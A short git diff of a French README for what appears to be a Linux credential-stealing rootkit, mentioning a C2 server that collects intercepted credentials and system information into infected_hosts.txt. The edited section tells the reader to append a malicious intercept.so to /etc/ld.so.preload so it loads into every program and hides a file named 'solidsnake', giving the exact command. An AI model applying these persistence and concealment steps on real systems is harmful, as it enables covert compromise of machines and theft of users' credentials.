@@ -103,7 +103,7 @@ ssh user@<IP_de_votre_machine_infectée>
 
 Les données interceptées (comme les identifiants et informations système) doivent apparaître dans le terminal où tourne le serveur C2. Une fois les données interceptées, un fichier nommé `infected_hosts.txt` sera créé et contiendra toutes les informations récupérées.
 
-### **6. LD_PRELOAD caché dans  pour le fichier solidsnake dans `/etc/ld.so.preload`**
+### **6. LD_PRELOAD caché pour le fichier solidsnake dans `/etc/ld.so.preload`**
 Si tu veux que `LD_PRELOAD` soit chargé à chaque exécution de programme, pour cacher le fichier `solidsnake`, ajoute le chemin du `.so` dans `/etc/ld.so.preload` :
 ```bash
 echo "/chemin/vers/intercept.so" | sudo tee -a /etc/ld.so.preload
